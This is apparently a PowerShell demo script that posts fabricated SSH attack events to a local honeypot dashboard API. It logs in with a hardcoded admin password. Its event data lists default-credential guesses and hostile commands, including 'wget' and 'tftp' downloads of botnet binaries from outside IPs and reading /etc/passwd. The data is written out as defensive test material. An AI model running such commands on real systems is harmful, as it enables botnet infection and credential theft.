# =====================================================
#  HoneyShield Live Demo Attack Simulator
# =====================================================

$API = "http://localhost:8000/api/v1"

Write-Host ""
Write-Host "[*] Authenticating with HoneyShield API..." -ForegroundColor Cyan
try {
    $loginRes = Invoke-RestMethod -Uri "$API/auth/login" -Method Post -ContentType "application/json" -Body '{"username":"admin","password":"Admin@1234!"}'
    $token = $loginRes.access_token
    $headers = @{ Authorization = "Bearer $token" }
    Write-Host "[+] Authenticated successfully as admin" -ForegroundColor Green
}
catch {
    Write-Host "[!] Login failed. Sending unauthenticated bridge events..." -ForegroundColor Yellow
    $headers = @{}
}

# Fetch target honeypot ID dynamically
try {
    $hps = Invoke-RestMethod -Uri "$API/honeypots" -Method Get -Headers $headers
    if ($hps -and $hps.Count -gt 0) {
        $hpId = $hps[0].id
        Write-Host "[+] Target Honeypot Sensor: $($hps[0].name) ($hpId)" -ForegroundColor Green
    }
    else {
        $hpId = "d18ed9b6-eb11-43ed-911e-2e2dcf52359d"
    }
}
catch {
    $hpId = "d18ed9b6-eb11-43ed-911e-2e2dcf52359d"
}

# Attack simulation telemetry dataset
$srcIps = "185.220.101.45", "103.234.220.197", "45.155.205.233", "176.10.116.77", "104.16.99.52", "91.240.118.172", "193.35.18.170", "162.216.149.98"
$types = "brute_force", "brute_force", "brute_force", "exploit", "scan", "brute_force", "exploit", "brute_force"
$users = "root", "admin", "pi", "root", "guest", "admin", "root", "ubuntu"
$passwords = "123456", "admin", "raspberry", "toor", "none", "pass1234", "password", "ubuntu"
$countries = "RU", "CN", "DE", "TH", "US", "UA", "NL", "BR"
$exploits = "", "", "", "CVE-2018-10933", "", "", "CVE-2021-44228", ""
$commands = "cat /etc/passwd", "uname -a", "id", "wget http://45.14.2.1/mirai.x86", "busybox echo HI", "sh /tmp/botnet.sh", "tftp -g 185.220.102.8 -r bot.exe", "whoami"

Write-Host ""
Write-Host "[*] Launching live attack simulation... Watch your dashboard!" -ForegroundColor Red
Write-Host "    Dashboard: http://localhost:5173" -ForegroundColor White
Write-Host ""

for ($i = 0; $i -lt $srcIps.Length; $i++) {
    $p = [ordered]@{
        username = [string]$users[$i]
        password = [string]$passwords[$i]
        country  = [string]$countries[$i]
        command  = [string]$commands[$i]
    }
    if ($exploits[$i] -ne "") { $p["exploit"] = [string]$exploits[$i] }

    $evt = [ordered]@{
        event_type = [string]$types[$i]
        protocol   = "ssh"
        src_ip     = [string]$srcIps[$i]
        src_port   = (Get-Random -Min 1024 -Max 65535)
        dst_port   = 2222
        session_id = [System.Guid]::NewGuid().ToString()
        payload    = $p
        raw_size   = (Get-Random -Min 200 -Max 2000)
    }

    $jsonBody = $evt | ConvertTo-Json -Depth 5 -Compress

    try {
        $null = Invoke-RestMethod -Uri "$API/events/$hpId/events" -Method Post -ContentType "application/json" -Headers $headers -Body $jsonBody
        Write-Host "  [ATTACK LIVE] $($srcIps[$i].PadRight(18)) --> $($types[$i].ToUpper().PadRight(12)) as '$($users[$i])' [$($countries[$i])]" -ForegroundColor Red
    }
    catch {
        Write-Host "  [FAIL]   $($srcIps[$i]) -- $($_.Exception.Message)" -ForegroundColor DarkGray
    }
    Start-Sleep -Milliseconds 800
}

Write-Host ""
Write-Host "[+] Live Attack Simulation complete! $($srcIps.Length) attack events injected." -ForegroundColor Green
Write-Host "    Open http://localhost:5173 to view updated real-time metrics!" -ForegroundColor Cyan
